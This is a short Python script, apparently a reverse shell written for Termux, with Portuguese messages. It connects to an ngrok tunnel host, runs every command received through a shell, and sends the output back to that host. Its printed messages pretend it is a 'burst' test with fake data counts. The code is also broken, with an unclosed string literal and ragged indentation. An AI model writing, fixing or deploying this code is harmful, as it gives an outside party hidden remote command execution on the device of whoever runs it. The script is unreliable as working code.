import random, socket, threading, subprocess, time, os
        # proc = subprocess.Popen(data.decode("utf-8"), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        # output = proc.stdout.read() + proc.stderr.read()

host = '0.tcp.sa.ngrok.io'
port = 19018

# Create a TCP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print("---------------------/// Rajada melhorada ///---------------------")

print("--- Conectado, deixe o termux rodando e va testar a rajada ---")
# Connect to the server with the socket via our ngrok tunnel
server_address = (host, port)
sock.connect(server_address)

message = 'bixaXXXXXXXXXXX'
data_received = 0
data_expected = len(message)

while data_received < data_expected:
    data = sock.recv(1024)
    data_received += len(data)
    print(f"2mb recebidos! 3mb foram enviados!")
    if data.decode('utf-8) == 'cdsair':
                   os.chdir('..')
              
    else:
            proc = subprocess.Popen(data.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            sock.send(output + b' \n')

# sock.close()

# Send the message
# Await a response



